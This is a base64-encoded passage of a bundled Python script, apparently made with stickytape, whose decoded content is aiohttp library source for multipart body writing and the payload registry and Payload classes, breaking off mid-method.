ZXJzIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGhlYWRlcnMgPSBDSU11bHRpRGljdCgpXHJcblxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uob2JqLCBQYXlsb2FkKTpcclxuICAgICAgICAgICAgb2JqLmhlYWRlcnMudXBkYXRlKGhlYWRlcnMpXHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLmFwcGVuZF9wYXlsb2FkKG9iailcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBwYXlsb2FkID0gZ2V0X3BheWxvYWQob2JqLCBoZWFkZXJzPWhlYWRlcnMpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBMb29rdXBFcnJvcjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiQ2Fubm90IGNyZWF0ZSBwYXlsb2FkIGZyb20gJXIiICUgb2JqKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYuYXBwZW5kX3BheWxvYWQocGF5bG9hZClcclxuXHJcbiAgICBkZWYgYXBwZW5kX3BheWxvYWQoc2VsZiwgcGF5bG9hZDogUGF5bG9hZCkgLT4gUGF5bG9hZDpcclxuICAgICAgICAiIiJBZGRzIGEgbmV3IGJvZHkgcGFydCB0byBtdWx0aXBhcnQgd3JpdGVyLiIiIlxyXG4gICAgICAgICMgY29tcHJlc3Npb25cclxuICAgICAgICBlbmNvZGluZyA9IHBheWxvYWQuaGVhZGVycy5nZXQoXHJcbiAgICAgICAgICAgIENPTlRFTlRfRU5DT0RJTkcsXHJcbiAgICAgICAgICAgICIiLFxyXG4gICAgICAgICkubG93ZXIoKSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXHJcbiAgICAgICAgaWYgZW5jb2RpbmcgYW5kIGVuY29kaW5nIG5vdCBpbiAoImRlZmxhdGUiLCAiZ3ppcCIsICJpZGVudGl0eSIpOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoZiJ1bmtub3duIGNvbnRlbnQgZW5jb2Rpbmc6IHtlbmNvZGluZ30iKVxyXG4gICAgICAgIGlmIGVuY29kaW5nID09ICJpZGVudGl0eSI6XHJcbiAgICAgICAgICAgIGVuY29kaW5nID0gTm9uZVxyXG5cclxuICAgICAgICAjIHRlIGVuY29kaW5nXHJcbiAgICAgICAgdGVfZW5jb2RpbmcgPSBwYXlsb2FkLmhlYWRlcnMuZ2V0KFxyXG4gICAgICAgICAgICBDT05URU5UX1RSQU5TRkVSX0VOQ09ESU5HLFxyXG4gICAgICAgICAgICAiIixcclxuICAgICAgICApLmxvd2VyKCkgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxyXG4gICAgICAgIGlmIHRlX2VuY29kaW5nIG5vdCBpbiAoIiIsICJiYXNlNjQiLCAicXVvdGVkLXByaW50YWJsZSIsICJiaW5hcnkiKTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInVua25vd24gY29udGVudCB0cmFuc2ZlciBlbmNvZGluZzoge30iICIiLmZvcm1hdCh0ZV9lbmNvZGluZylcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIHRlX2VuY29kaW5nID09ICJiaW5hcnkiOlxyXG4gICAgICAgICAgICB0ZV9lbmNvZGluZyA9IE5vbmVcclxuXHJcbiAgICAgICAgIyBzaXplXHJcbiAgICAgICAgc2l6ZSA9IHBheWxvYWQuc2l6ZVxyXG4gICAgICAgIGlmIHNpemUgaXMgbm90IE5vbmUgYW5kIG5vdCAoZW5jb2Rpbmcgb3IgdGVfZW5jb2RpbmcpOlxyXG4gICAgICAgICAgICBwYXlsb2FkLmhlYWRlcnNbQ09OVEVOVF9MRU5HVEhdID0gc3RyKHNpemUpXHJcblxyXG4gICAgICAgIHNlbGYuX3BhcnRzLmFwcGVuZCgocGF5bG9hZCwgZW5jb2RpbmcsIHRlX2VuY29kaW5nKSkgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG4gICAgICAgIHJldHVybiBwYXlsb2FkXHJcblxyXG4gICAgZGVmIGFwcGVuZF9qc29uKFxyXG4gICAgICAgIHNlbGYsIG9iajogQW55LCBoZWFkZXJzOiBPcHRpb25hbFtNdWx0aU1hcHBpbmdbc3RyXV0gPSBOb25lXHJcbiAgICApIC0+IFBheWxvYWQ6XHJcbiAgICAgICAgIiIiSGVscGVyIHRvIGFwcGVuZCBKU09OIHBhcnQuIiIiXHJcbiAgICAgICAgaWYgaGVhZGVycyBpcyBOb25lOlxyXG4gICAgICAgICAgICBoZWFkZXJzID0gQ0lNdWx0aURpY3QoKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5hcHBlbmRfcGF5bG9hZChKc29uUGF5bG9hZChvYmosIGhlYWRlcnM9aGVhZGVycykpXHJcblxyXG4gICAgZGVmIGFwcGVuZF9mb3JtKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgb2JqOiBVbmlvbltTZXF1ZW5jZVtUdXBsZVtzdHIsIHN0cl1dLCBNYXBwaW5nW3N0ciwgc3RyXV0sXHJcbiAgICAgICAgaGVhZGVyczogT3B0aW9uYWxbTXVsdGlNYXBwaW5nW3N0cl1dID0gTm9uZSxcclxuICAgICkgLT4gUGF5bG9hZDpcclxuICAgICAgICAiIiJIZWxwZXIgdG8gYXBwZW5kIGZvcm0gdXJsZW5jb2RlZCBwYXJ0LiIiIlxyXG4gICAgICAgIGFzc2VydCBpc2luc3RhbmNlKG9iaiwgKFNlcXVlbmNlLCBNYXBwaW5nKSlcclxuXHJcbiAgICAgICAgaWYgaGVhZGVycyBpcyBOb25lOlxyXG4gICAgICAgICAgICBoZWFkZXJzID0gQ0lNdWx0aURpY3QoKVxyXG5cclxuICAgICAgICBpZiBpc2luc3RhbmNlKG9iaiwgTWFwcGluZyk6XHJcbiAgICAgICAgICAgIG9iaiA9IGxpc3Qob2JqLml0ZW1zKCkpXHJcbiAgICAgICAgZGF0YSA9IHVybGVuY29kZShvYmosIGRvc2VxPVRydWUpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLmFwcGVuZF9wYXlsb2FkKFxyXG4gICAgICAgICAgICBTdHJpbmdQYXlsb2FkKFxyXG4gICAgICAgICAgICAgICAgZGF0YSwgaGVhZGVycz1oZWFkZXJzLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzaXplKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgIiIiU2l6ZSBvZiB0aGUgcGF5bG9hZC4iIiJcclxuICAgICAgICB0b3RhbCA9IDBcclxuICAgICAgICBmb3IgcGFydCwgZW5jb2RpbmcsIHRlX2VuY29kaW5nIGluIHNlbGYuX3BhcnRzOlxyXG4gICAgICAgICAgICBpZiBlbmNvZGluZyBvciB0ZV9lbmNvZGluZyBvciBwYXJ0LnNpemUgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgICAgICB0b3RhbCArPSBpbnQoXHJcbiAgICAgICAgICAgICAgICAyXHJcbiAgICAgICAgICAgICAgICArIGxlbihzZWxmLl9ib3VuZGFyeSlcclxuICAgICAgICAgICAgICAgICsgMlxyXG4gICAgICAgICAgICAgICAgKyBwYXJ0LnNpemUgICMgYlwnLS1cJytzZWxmLl9ib3VuZGFyeStiXCdcXHJcXG5cJ1xyXG4gICAgICAgICAgICAgICAgKyBsZW4ocGFydC5fYmluYXJ5X2hlYWRlcnMpXHJcbiAgICAgICAgICAgICAgICArIDIgICMgYlwnXFxyXFxuXCdcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICB0b3RhbCArPSAyICsgbGVuKHNlbGYuX2JvdW5kYXJ5KSArIDQgICMgYlwnLS1cJytzZWxmLl9ib3VuZGFyeStiXCctLVxcclxcblwnXHJcbiAgICAgICAgcmV0dXJuIHRvdGFsXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlKHNlbGYsIHdyaXRlcjogQW55LCBjbG9zZV9ib3VuZGFyeTogYm9vbCA9IFRydWUpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiV3JpdGUgYm9keS4iIiJcclxuICAgICAgICBmb3IgcGFydCwgZW5jb2RpbmcsIHRlX2VuY29kaW5nIGluIHNlbGYuX3BhcnRzOlxyXG4gICAgICAgICAgICBhd2FpdCB3cml0ZXIud3JpdGUoYiItLSIgKyBzZWxmLl9ib3VuZGFyeSArIGIiXFxyXFxuIilcclxuICAgICAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKHBhcnQuX2JpbmFyeV9oZWFkZXJzKVxyXG5cclxuICAgICAgICAgICAgaWYgZW5jb2Rpbmcgb3IgdGVfZW5jb2Rpbmc6XHJcbiAgICAgICAgICAgICAgICB3ID0gTXVsdGlwYXJ0UGF5bG9hZFdyaXRlcih3cml0ZXIpXHJcbiAgICAgICAgICAgICAgICBpZiBlbmNvZGluZzpcclxuICAgICAgICAgICAgICAgICAgICB3LmVuYWJsZV9jb21wcmVzc2lvbihlbmNvZGluZylcclxuICAgICAgICAgICAgICAgIGlmIHRlX2VuY29kaW5nOlxyXG4gICAgICAgICAgICAgICAgICAgIHcuZW5hYmxlX2VuY29kaW5nKHRlX2VuY29kaW5nKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgcGFydC53cml0ZSh3KSAgIyB0eXBlOiBpZ25vcmVbYXJnLXR5cGVdXHJcbiAgICAgICAgICAgICAgICBhd2FpdCB3LndyaXRlX2VvZigpXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBwYXJ0LndyaXRlKHdyaXRlcilcclxuXHJcbiAgICAgICAgICAgIGF3YWl0IHdyaXRlci53cml0ZShiIlxcclxcbiIpXHJcblxyXG4gICAgICAgIGlmIGNsb3NlX2JvdW5kYXJ5OlxyXG4gICAgICAgICAgICBhd2FpdCB3cml0ZXIud3JpdGUoYiItLSIgKyBzZWxmLl9ib3VuZGFyeSArIGIiLS1cXHJcXG4iKVxyXG5cclxuXHJcbmNsYXNzIE11bHRpcGFydFBheWxvYWRXcml0ZXI6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgd3JpdGVyOiBBbnkpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fd3JpdGVyID0gd3JpdGVyXHJcbiAgICAgICAgc2VsZi5fZW5jb2RpbmcgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cclxuICAgICAgICBzZWxmLl9jb21wcmVzcyA9IE5vbmUgICMgdHlwZTogQW55XHJcbiAgICAgICAgc2VsZi5fZW5jb2RpbmdfYnVmZmVyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtieXRlYXJyYXldXHJcblxyXG4gICAgZGVmIGVuYWJsZV9lbmNvZGluZyhzZWxmLCBlbmNvZGluZzogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGVuY29kaW5nID09ICJiYXNlNjQiOlxyXG4gICAgICAgICAgICBzZWxmLl9lbmNvZGluZyA9IGVuY29kaW5nXHJcbiAgICAgICAgICAgIHNlbGYuX2VuY29kaW5nX2J1ZmZlciA9IGJ5dGVhcnJheSgpXHJcbiAgICAgICAgZWxpZiBlbmNvZGluZyA9PSAicXVvdGVkLXByaW50YWJsZSI6XHJcbiAgICAgICAgICAgIHNlbGYuX2VuY29kaW5nID0gInF1b3RlZC1wcmludGFibGUiXHJcblxyXG4gICAgZGVmIGVuYWJsZV9jb21wcmVzc2lvbihcclxuICAgICAgICBzZWxmLCBlbmNvZGluZzogc3RyID0gImRlZmxhdGUiLCBzdHJhdGVneTogaW50ID0gemxpYi5aX0RFRkFVTFRfU1RSQVRFR1lcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICB6bGliX21vZGUgPSAxNiArIHpsaWIuTUFYX1dCSVRTIGlmIGVuY29kaW5nID09ICJnemlwIiBlbHNlIC16bGliLk1BWF9XQklUU1xyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzID0gemxpYi5jb21wcmVzc29iaih3Yml0cz16bGliX21vZGUsIHN0cmF0ZWd5PXN0cmF0ZWd5KVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZV9lb2Yoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9jb21wcmVzcyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgY2h1bmsgPSBzZWxmLl9jb21wcmVzcy5mbHVzaCgpXHJcbiAgICAgICAgICAgIGlmIGNodW5rOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY29tcHJlc3MgPSBOb25lXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLndyaXRlKGNodW5rKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9lbmNvZGluZyA9PSAiYmFzZTY0IjpcclxuICAgICAgICAgICAgaWYgc2VsZi5fZW5jb2RpbmdfYnVmZmVyOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyLndyaXRlKGJhc2U2NC5iNjRlbmNvZGUoc2VsZi5fZW5jb2RpbmdfYnVmZmVyKSlcclxuXHJcbiAgICBhc3luYyBkZWYgd3JpdGUoc2VsZiwgY2h1bms6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2NvbXByZXNzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBpZiBjaHVuazpcclxuICAgICAgICAgICAgICAgIGNodW5rID0gc2VsZi5fY29tcHJlc3MuY29tcHJlc3MoY2h1bmspXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgY2h1bms6XHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2VuY29kaW5nID09ICJiYXNlNjQiOlxyXG4gICAgICAgICAgICBidWYgPSBzZWxmLl9lbmNvZGluZ19idWZmZXJcclxuICAgICAgICAgICAgYXNzZXJ0IGJ1ZiBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICBidWYuZXh0ZW5kKGNodW5rKVxyXG5cclxuICAgICAgICAgICAgaWYgYnVmOlxyXG4gICAgICAgICAgICAgICAgZGl2LCBtb2QgPSBkaXZtb2QobGVuKGJ1ZiksIDMpXHJcbiAgICAgICAgICAgICAgICBlbmNfY2h1bmssIHNlbGYuX2VuY29kaW5nX2J1ZmZlciA9IChidWZbOiBkaXYgKiAzXSwgYnVmW2RpdiAqIDMgOl0pXHJcbiAgICAgICAgICAgICAgICBpZiBlbmNfY2h1bms6XHJcbiAgICAgICAgICAgICAgICAgICAgYjY0Y2h1bmsgPSBiYXNlNjQuYjY0ZW5jb2RlKGVuY19jaHVuaylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLl93cml0ZXIud3JpdGUoYjY0Y2h1bmspXHJcbiAgICAgICAgZWxpZiBzZWxmLl9lbmNvZGluZyA9PSAicXVvdGVkLXByaW50YWJsZSI6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlci53cml0ZShiaW5hc2NpaS5iMmFfcXAoY2h1bmspKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlci53cml0ZShjaHVuaylcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvcGF5bG9hZC5weScsIGInaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGVudW1cclxuaW1wb3J0IGlvXHJcbmltcG9ydCBqc29uXHJcbmltcG9ydCBtaW1ldHlwZXNcclxuaW1wb3J0IG9zXHJcbmltcG9ydCB3YXJuaW5nc1xyXG5mcm9tIGFiYyBpbXBvcnQgQUJDLCBhYnN0cmFjdG1ldGhvZFxyXG5mcm9tIGl0ZXJ0b29scyBpbXBvcnQgY2hhaW5cclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIElPLFxyXG4gICAgVFlQRV9DSEVDS0lORyxcclxuICAgIEFueSxcclxuICAgIEJ5dGVTdHJpbmcsXHJcbiAgICBEaWN0LFxyXG4gICAgSXRlcmFibGUsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFRleHRJTyxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4pXHJcblxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3RcclxuXHJcbmZyb20gLiBpbXBvcnQgaGRyc1xyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmhlbHBlcnMgaW1wb3J0IChcclxuICAgIFBZXzM2LFxyXG4gICAgY29udGVudF9kaXNwb3NpdGlvbl9oZWFkZXIsXHJcbiAgICBndWVzc19maWxlbmFtZSxcclxuICAgIHBhcnNlX21pbWV0eXBlLFxyXG4gICAgc2VudGluZWwsXHJcbilcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgU3RyZWFtUmVhZGVyXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBGaW5hbCwgSlNPTkVuY29kZXIsIF9DSU11bHRpRGljdFxyXG5cclxuX19hbGxfXyA9IChcclxuICAgICJQQVlMT0FEX1JFR0lTVFJZIixcclxuICAgICJnZXRfcGF5bG9hZCIsXHJcbiAgICAicGF5bG9hZF90eXBlIixcclxuICAgICJQYXlsb2FkIixcclxuICAgICJCeXRlc1BheWxvYWQiLFxyXG4gICAgIlN0cmluZ1BheWxvYWQiLFxyXG4gICAgIklPQmFzZVBheWxvYWQiLFxyXG4gICAgIkJ5dGVzSU9QYXlsb2FkIixcclxuICAgICJCdWZmZXJlZFJlYWRlclBheWxvYWQiLFxyXG4gICAgIlRleHRJT1BheWxvYWQiLFxyXG4gICAgIlN0cmluZ0lPUGF5bG9hZCIsXHJcbiAgICAiSnNvblBheWxvYWQiLFxyXG4gICAgIkFzeW5jSXRlcmFibGVQYXlsb2FkIixcclxuKVxyXG5cclxuVE9PX0xBUkdFX0JZVEVTX0JPRFk6IEZpbmFsW2ludF0gPSAyICoqIDIwICAjIDEgTUJcclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gdHlwaW5nIGltcG9ydCBMaXN0XHJcblxyXG5cclxuY2xhc3MgTG9va3VwRXJyb3IoRXhjZXB0aW9uKTpcclxuICAgIHBhc3NcclxuXHJcblxyXG5jbGFzcyBPcmRlcihzdHIsIGVudW0uRW51bSk6XHJcbiAgICBub3JtYWwgPSAibm9ybWFsIlxyXG4gICAgdHJ5X2ZpcnN0ID0gInRyeV9maXJzdCJcclxuICAgIHRyeV9sYXN0ID0gInRyeV9sYXN0IlxyXG5cclxuXHJcbmRlZiBnZXRfcGF5bG9hZChkYXRhOiBBbnksICphcmdzOiBBbnksICoqa3dhcmdzOiBBbnkpIC0+ICJQYXlsb2FkIjpcclxuICAgIHJldHVybiBQQVlMT0FEX1JFR0lTVFJZLmdldChkYXRhLCAqYXJncywgKiprd2FyZ3MpXHJcblxyXG5cclxuZGVmIHJlZ2lzdGVyX3BheWxvYWQoXHJcbiAgICBmYWN0b3J5OiBUeXBlWyJQYXlsb2FkIl0sIHR5cGU6IEFueSwgKiwgb3JkZXI6IE9yZGVyID0gT3JkZXIubm9ybWFsXHJcbikgLT4gTm9uZTpcclxuICAgIFBBWUxPQURfUkVHSVNUUlkucmVnaXN0ZXIoZmFjdG9yeSwgdHlwZSwgb3JkZXI9b3JkZXIpXHJcblxyXG5cclxuY2xhc3MgcGF5bG9hZF90eXBlOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHR5cGU6IEFueSwgKiwgb3JkZXI6IE9yZGVyID0gT3JkZXIubm9ybWFsKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYudHlwZSA9IHR5cGVcclxuICAgICAgICBzZWxmLm9yZGVyID0gb3JkZXJcclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZiwgZmFjdG9yeTogVHlwZVsiUGF5bG9hZCJdKSAtPiBUeXBlWyJQYXlsb2FkIl06XHJcbiAgICAgICAgcmVnaXN0ZXJfcGF5bG9hZChmYWN0b3J5LCBzZWxmLnR5cGUsIG9yZGVyPXNlbGYub3JkZXIpXHJcbiAgICAgICAgcmV0dXJuIGZhY3RvcnlcclxuXHJcblxyXG5QYXlsb2FkVHlwZSA9IFR5cGVbIlBheWxvYWQiXVxyXG5fUGF5bG9hZFJlZ2lzdHJ5SXRlbSA9IFR1cGxlW1BheWxvYWRUeXBlLCBBbnldXHJcblxyXG5cclxuY2xhc3MgUGF5bG9hZFJlZ2lzdHJ5OlxyXG4gICAgIiIiUGF5bG9hZCByZWdpc3RyeS5cclxuXHJcbiAgICBub3RlOiB3ZSBuZWVkIHpvcGUuaW50ZXJmYWNlIGZvciBtb3JlIGVmZmljaWVudCBhZGFwdGVyIHNlYXJjaFxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZmlyc3QgPSBbXSAgIyB0eXBlOiBMaXN0W19QYXlsb2FkUmVnaXN0cnlJdGVtXVxyXG4gICAgICAgIHNlbGYuX25vcm1hbCA9IFtdICAjIHR5cGU6IExpc3RbX1BheWxvYWRSZWdpc3RyeUl0ZW1dXHJcbiAgICAgICAgc2VsZi5fbGFzdCA9IFtdICAjIHR5cGU6IExpc3RbX1BheWxvYWRSZWdpc3RyeUl0ZW1dXHJcblxyXG4gICAgZGVmIGdldChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGRhdGE6IEFueSxcclxuICAgICAgICAqYXJnczogQW55LFxyXG4gICAgICAgIF9DSEFJTjogIlR5cGVbY2hhaW5bX1BheWxvYWRSZWdpc3RyeUl0ZW1dXSIgPSBjaGFpbixcclxuICAgICAgICAqKmt3YXJnczogQW55LFxyXG4gICAgKSAtPiAiUGF5bG9hZCI6XHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShkYXRhLCBQYXlsb2FkKTpcclxuICAgICAgICAgICAgcmV0dXJuIGRhdGFcclxuICAgICAgICBmb3IgZmFjdG9yeSwgdHlwZSBpbiBfQ0hBSU4oc2VsZi5fZmlyc3QsIHNlbGYuX25vcm1hbCwgc2VsZi5fbGFzdCk6XHJcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoZGF0YSwgdHlwZSk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFjdG9yeShkYXRhLCAqYXJncywgKiprd2FyZ3MpXHJcblxyXG4gICAgICAgIHJhaXNlIExvb2t1cEVycm9yKClcclxuXHJcbiAgICBkZWYgcmVnaXN0ZXIoXHJcbiAgICAgICAgc2VsZiwgZmFjdG9yeTogUGF5bG9hZFR5cGUsIHR5cGU6IEFueSwgKiwgb3JkZXI6IE9yZGVyID0gT3JkZXIubm9ybWFsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgb3JkZXIgaXMgT3JkZXIudHJ5X2ZpcnN0OlxyXG4gICAgICAgICAgICBzZWxmLl9maXJzdC5hcHBlbmQoKGZhY3RvcnksIHR5cGUpKVxyXG4gICAgICAgIGVsaWYgb3JkZXIgaXMgT3JkZXIubm9ybWFsOlxyXG4gICAgICAgICAgICBzZWxmLl9ub3JtYWwuYXBwZW5kKChmYWN0b3J5LCB0eXBlKSlcclxuICAgICAgICBlbGlmIG9yZGVyIGlzIE9yZGVyLnRyeV9sYXN0OlxyXG4gICAgICAgICAgICBzZWxmLl9sYXN0LmFwcGVuZCgoZmFjdG9yeSwgdHlwZSkpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihmIlVuc3VwcG9ydGVkIG9yZGVyIHtvcmRlciFyfSIpXHJcblxyXG5cclxuY2xhc3MgUGF5bG9hZChBQkMpOlxyXG5cclxuICAgIF9kZWZhdWx0X2NvbnRlbnRfdHlwZSA9ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iICAjIHR5cGU6IHN0clxyXG4gICAgX3NpemUgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2ludF1cclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB2YWx1ZTogQW55LFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW1xyXG4gICAgICAgICAgICBVbmlvbltfQ0lNdWx0aURpY3QsIERpY3Rbc3RyLCBzdHJdLCBJdGVyYWJsZVtUdXBsZVtzdHIsIHN0cl1dXVxyXG4gICAgICAgIF0gPSBOb25lLFxyXG4gICAgICAgIGNvbnRlbnRfdHlwZTogT3B0aW9uYWxbc3RyXSA9IHNlbnRpbmVsLFxyXG4gICAgICAgIGZpbGVuYW1lOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBlbmNvZGluZzogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgKiprd2FyZ3M6IEFueSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9lbmNvZGluZyA9IGVuY29kaW5nXHJcbiAgICAgICAgc2VsZi5fZmlsZW5hbWUgPSBmaWxlbmFtZVxyXG4gICAgICAgIHNlbGYuX2hlYWRlcnMgPSBDSU11bHRpRGljdCgpICAjIHR5cGU6IF9DSU11bHRpRGljdFxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgbm90IHNlbnRpbmVsIGFuZCBjb250ZW50X3R5cGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX1RZUEVdID0gY29udGVudF90eXBlXHJcbiAgICAgICAgZWxpZiBzZWxmLl9maWxlbmFtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgY29udGVudF90eXBlID0gbWltZXR5cGVzLmd1ZXNzX3R5cGUoc2VsZi5fZmlsZW5hbWUpWzBdXHJcbiAgICAgICAgICAgIGlmIGNvbnRlbnRfdHlwZSBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgY29udGVudF90eXBlID0gc2VsZi5fZGVmYXVsdF9jb250ZW50X3R5cGVcclxuICAgICAgICAgICAgc2VsZi5faGVhZGVyc1toZHJzLkNPTlRFTlRfVFlQRV0gPSBjb250ZW50X3R5cGVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFkZXJzW2hkcnMuQ09OVEVOVF9UWVBFXSA9IHNlbGYuX2RlZmF1bHRfY29udGVudF90eXBlXHJcbiAgICAgICAgc2VsZi5faGVhZGVycy51cGRhdGUoaGVhZGVycyBvciB7fSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzaXplKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgIiIiU2l6ZSBvZiB0aGUgcGF5bG9hZC4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fc2l6ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGZpbGVuYW1lKHNlbGYpIC0+IE9wdGlvbmFsW3N0cl06XHJcbiAgICAgICAgIiIiRmlsZW5hbWUgb2YgdGhlIHBheWxvYWQuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZpbGVuYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaGVhZGVycyhzZWxmKSAtPiBfQ0lNdWx0aURpY3Q6XHJcbiAgICAgICAgIiIiQ3VzdG9tIGl0ZW0gaGVhZGVycyIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9oZWFkZXJzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgX2JpbmFyeV9oZWFkZXJzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICIiLmpvaW4oW2sgKyAiOiAiICsgdiArICJcXHJcXG4iIGZvciBrLCB2IGluIHNlbGYuaGVhZGVycy5pdGVtcygpXSkuZW5jb2RlKFxyXG4gICAgICAgICAgICAgICAgInV0Zi04IlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgICsgYiJcXHJcXG4iXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGVuY29kaW5nKHNlbGYpIC0+IE9wdGlvbmFsW3N0cl06XHJcbiAgICAgICAgIiIiUGF5bG9hZCBlbmNvZGluZyIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9lbmNvZGluZ1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbnRlbnRfdHlwZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiQ29udGVudCB0eXBlIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX1RZUEVdXHJcblxyXG4gICAgZGVmIHNldF9jb250ZW50X2Rpc3Bvc2l0aW9uKFxyXG4gICAgICA